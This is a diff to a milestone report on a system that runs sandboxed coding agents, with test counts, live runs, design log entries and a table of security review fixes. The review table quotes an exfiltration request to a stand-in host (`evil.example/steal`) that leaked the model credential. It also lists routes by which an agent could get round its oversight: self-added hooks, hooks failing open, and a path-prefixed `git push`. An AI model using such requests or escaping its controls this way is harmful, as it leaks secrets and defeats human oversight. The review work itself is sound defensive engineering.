@@ -8,8 +8,9 @@ shown by a Live test with the real model. SP2, SP3 and SP5 are tests, each run
 with a scripted model in the Integration category and with the real model in
 the Live category. A worker killed mid-step resumes from the same sandbox. M3
 follow-up 9 is fixed: a cancelled agent step is waited for. Each of the
-nineteen negative controls made its tests fail while the rule was broken
-(section 2.6). LOG 91 to 103 are new and unreviewed.
+thirty-four negative controls, fifteen of them added after review, made its tests fail while the rule was broken
+(section 2.6). LOG 91 to 106 are new and unreviewed. The M4 review's changes are in
+section 10.
 
 ## 1. What was built
 
@@ -154,14 +155,15 @@ recording asserts both) and no local path.
 
 ### 2.8 Counts
 
-The default category has 353 tests, up from M3's 288: `Validation.Tests` 73,
-`Interpreter.Tests` 58, `Expressions.Tests` 48, `Engine.Agent.Tests` 39 (new),
-`Testing.Workflows.Tests` 26, `Model.Tests` 25, `Architecture.Tests` 20,
-`Cli.Tests` 15, `Replay.Tests` 7, `SandboxClient.Tests` 7 (new),
-`Providers.ClaudeCode.Tests` 7 (new), `Providers.GitHub.Tests` 7 (new),
-`Providers.Local.Tests` 7, `Api.Tests` 6, `Library.Tests` 5, `Hosting.Tests` 3.
-The integration category has 22, up from 10: M3's ten and twelve agent step
-tests, which together take about 80 seconds. The Live category has 6.
+After the review, the default category has 389 tests, up from M3's 288:
+`Validation.Tests` 73, `Engine.Agent.Tests` 64 (new), `Interpreter.Tests` 58,
+`Expressions.Tests` 48, `Model.Tests` 26, `Testing.Workflows.Tests` 26,
+`Architecture.Tests` 20, `Providers.ClaudeCode.Tests` 16 (new), `Cli.Tests` 15,
+`SandboxClient.Tests` 8 (new), `Replay.Tests` 7, `Providers.GitHub.Tests` 7
+(new), `Providers.Local.Tests` 7, `Api.Tests` 6, `Library.Tests` 5,
+`Hosting.Tests` 3. The integration category has 29, up from 10: M3's ten and
+nineteen agent step tests, seven of them added after review; together about
+3.5 minutes. The Live category has 6. Before the review the counts were 353 and 22.
 
 ## 3. Live runs
 
@@ -177,12 +179,14 @@ reference it pushed, except the first done-when run (below).
 | 3 | Fall-back and stop, after changes | Both passed. The runtime now tells the agent, in its prompt, that the report tool is absent. The agent's first `report.json` had an empty summary; it was rejected and corrected in a continued session. The stop test now accepts either way the attempt fails |
 | 4 | All six, final code | Five passed: the done-when (hidden reference `507ceb7f60` seen while the branch was at `main`, then the branch moved to it), SP2's restart, SP3's correction, fall-back (rejected, then corrected) and stop (two rejections, then the agent stopped; the attempt failed). SP5 failed: asked also to list every process environment, the real agent reported `blocked` |
 | 5 | SP5 with `env` only | Passed: no credential name or value in the environment or transcript, empty startup files. The process-environment listing stays in the Integration test, where its control holds |
+| 6 | Done-when and SP5, after the review's changes (managed hook settings, the set-user-id client, the proxy allowlist) | Both passed. The done-when's commit `afec175466` was on the hidden reference while the branch was at `main`, then on the branch. No reference was left on the fixture |
 
 The model requests per run, from the proxy's records, were between 2 and 6.
 
 ## 4. Design changes
 
-LOG 91 to 103, unreviewed. Notes saying "Pending review (LOG n)" mark the
+LOG 91 to 106, unreviewed; 91, 96, 97, 98 and 100 were revised and 104 to 106 added after the
+review (section 10). Notes saying "Pending review (LOG n)" mark the
 sections they touch: `docs/04` sections 3.3, 3.4 and 3.6, `docs/06` sections 3
 and 3.13, and `docs/07` section 2.
 
@@ -201,6 +205,9 @@ and 3.13, and `docs/07` section 2.
 | 101 | The hook policy's rules |
 | 102 | Cancellation is waited for; a worker shutting down leaves the sandbox |
 | 103 | The provider interfaces add methods to `docs/06`'s abbreviated signatures. **Changes approved interface text** |
+| 104 | The model proxy forwards only the Messages API, to its upstream. **An F6 breach found in review** |
+| 105 | The sandbox client runs set-user-id as an engine state user; no `checkpoint` tool; tokens revoked at the step's end; questions shown only to their step |
+| 106 | `limits.timeout` is enforced from the step's first attempt |
 
 ## 5. Implementation choices
 
@@ -232,7 +239,7 @@ client for `linux-x64`.
 
 | # | Question |
 |---|---|
-| 1 | LOG 91 to 103 need review; 91, 95 and 103 change approved text |
+| 1 | LOG 91 to 106 need review; 91, 95, 103 and 104 change or bear on approved text |
 
 ## 8. Follow-ups
 
@@ -244,14 +251,15 @@ Not done in M4:
 | 2 | An agent step works on one repository, the run's first |
 | 3 | The parent branch is `main`, as in M3's run values, until M5 reads the default branch from the code host |
 | 4 | The agent gets no read-only code host credential (LOG 95) |
-| 5 | `inspect_plan`, `propose_patch` and `run_check` are not offered; `checkpoint` is offered but has no test |
+| 5 | `inspect_plan`, `propose_patch`, `run_check` and `checkpoint` are not offered (LOG 105) |
 | 6 | The step's summary is not appended to the run context (`docs/04` section 3.5); toolsets are not proxied (`docs/06` section 3.9) |
-| 7 | Question waits do not pause the step's timeout; the question's timer is not cancelled when it is answered (it fires and does nothing) |
+| 7 | Question waits do not pause the step's timeout (LOG 106); the question's timer is not cancelled when it is answered (it fires and does nothing) |
 | 8 | A `with` value that is an artifact is not staged and rendered as a path (`docs/03` section 6.3); consumed artifacts are the latest of their name, as `plan.expand` reads them (M3 follow-up 3) |
 | 9 | Tokens and model per step are recorded as events from the proxy, not as cost records (`docs/02` section 8) |
 | 10 | SP3's tasks are tests in `FeatureFlow.Integration.Tests` and `FeatureFlow.Live.Tests`, not a contract suite in `Providers.Contracts` that another runtime could run |
 | 11 | The Docker sandbox applies no network policy or resource limits (its capabilities say so) |
-| 12 | The first Live run left `refs/heads/ff/ticket/LIVE-done-20261102061107` and `refs/feature-flow/wip/run-7f118d1c8572/implement` on the fixture repository. A bulk clean-up was refused by the session's permission check, so they remain for the product owner to delete or keep |
+| 12 | **Must fix before any shared deployment** (review finding 13): the sandbox's network is unrestricted, and `host-gateway` reaches every service on the worker's host, the Temporal frontend included |
+| 13 | DR20, the platform trust store, has no test (section 2.5) |
 
 ## 9. M3 follow-ups
 
@@ -259,3 +267,33 @@ Not done in M4:
 |---|---|
 | 9: step activities use `TryCancel` | Fixed (LOG 102), with a control |
 | 1 to 8, 10, 11 | Unchanged |
+
+## 10. Review changes
+
+The M4 review of pull request 2 asked for these changes, made at `8fba684` and
+after. Each has a test; each blocking one, and most others, a control
+(`tools/check_m4_controls.py`, "review 1" to "review 17"). All thirty-four
+controls were run again on the revised code and held.
+
+| # | Finding | Change | Test |
+|---|---|---|---|
+| 1 | **F6 breach**: the proxy built its target from the agent's path, so `POST /model/https://evil.example/steal` sent the credential to that host | Only `POST v1/messages` and `v1/messages/count_tokens`, relative, on the upstream's scheme, host and port; anything else is refused with 404 before the credential is read (LOG 104) | Six refused requests, none reaching the upstream or reading the credential; the target check; in the sandbox, the agent's `fetch` of an absolute URL through the proxy gets 404 |
+| 2 | A later execution checked out a stale hidden reference and a forced push could rewind the branch | The hidden reference is used only when it descends from the branch; the branch moves only to a commit that descends from its revision at the step's start (LOG 96) | `A_later_execution_starts_from_the_branch_when_the_hidden_reference_is_behind_it`; `A_final_commit_that_does_not_build_on_the_branch_is_not_pushed_to_it` |
+| 3 | A new sandbox ran `claude --resume` on a session it did not hold | A fresh session, told the attempt was interrupted (`docs/04` section 3.2) | `A_lost_sandbox_is_replaced_and_a_fresh_session_is_told_it_was_interrupted` |
+| 4 | `limits.timeout` was not enforced | A deadline from the first attempt, kept in the record store; the session is stopped and the attempt fails as out of time (LOG 106) | `A_step_past_its_timeout_is_stopped_and_fails_as_out_of_time` |
+| 5 | Resumes were unbounded and free, and the agent could trigger one | Engine state written by a set-user-id client; permanent model errors not resumable (401 and 403 stop for a person); a resume free only after progress; 5 in a row without progress or 20 in all stop for a person (LOG 98, 105) | `Resumes_without_progress_stop_for_a_person_after_the_cap`; `Only_transient_api_errors_are_resumable`; the boundary test's attempt to write `/ff/state` |
+| 6 | A hook answered with no decision allowed the call | The hook fails closed: anything but `allow` blocks | `The_hook_command_fails_closed_on_an_answer_with_no_decision` |
+| 7 | The agent could add hooks through its writable user settings | Hooks in root-owned managed settings with `allowManagedHooksOnly` (LOG 100) | The boundary test: the agent cannot change the managed settings, and a hook it writes into its user settings does not run in the next session |
+| 8 | Missing proof | Tests added | `A_work_branch_moved_by_someone_else_during_the_step_fails_the_attempt`; `.git` and tool-class theories in `ReportAndHookTests` |
+| 9 | Live clean-up | Runs are aborted and waited for before references are removed; the clean-up no longer asserts. Follow-up 12 of the first version (two leftover references) is removed: the coordinator deleted them with the product owner's approval | The final Live runs left no reference |
+| 10 | Sandbox leaks | A step that cannot answer, and a cancellation during preparation, remove the sandbox | The cap test checks the sandbox is gone |
+| 11 | Tokens outlived their step | Revoked when the attempt ends (LOG 105) | `A_revoked_step_s_token_is_refused` |
+| 12 | Any step could open another's question | Ownership checked | `A_question_of_another_step_is_not_shown` |
+| 14 | LOG 91 incomplete | LOG 91 lists every new key; `engine_tools: false` is refused unless `development: true` | A configuration test |
+| 15 | `run.branch` changed without versioning | Behind the patch marker `m4-branch-pattern` (LOG 97) | The recorded histories replay |
+| 16 | The broker control passed on any one refusal | It asks for all five cases | The control |
+| 17 | `git push` matched by a literal prefix | Matched by command name, so `/usr/bin/git push` is denied | Two more `A_git_push_is_denied` cases |
+| - | `CONTRIBUTING.md`'s co-author line | Now the Claude line the commits use | - |
+
+Recorded, not fixed: finding 13 (follow-up 12) and DR20's missing test
+(follow-up 13).
